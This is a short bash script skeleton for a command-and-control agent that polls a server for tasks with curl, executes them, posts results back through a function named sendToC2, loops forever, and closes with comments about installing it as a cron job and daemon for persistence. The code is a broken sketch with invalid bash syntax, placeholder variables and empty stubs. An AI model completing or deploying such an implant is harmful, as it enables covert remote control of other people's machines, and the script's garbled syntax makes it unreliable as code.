#!/bin/bash

JWT=(jwt)
uuid=(uuid)
server=(server)

function getTasks() {
    #hit endpoint
    responseJson=`curl ${server}/agent/get --H "Cookie: {$uuid}"`

    return responseJson
}

function executeTasks() {
    #execute tasks

    return output
}

function sendToC2() {
    #send result to server

    curl ${server}/send -X POST -d "some-data"
}

function main() {
    while [[ True ]]; do
        output=executeTasks(getTasks)
        sendToC2(output)

        sleep(1000);
    done
}


main
#set a cron-job to run this shell script for the user
#make it a daemon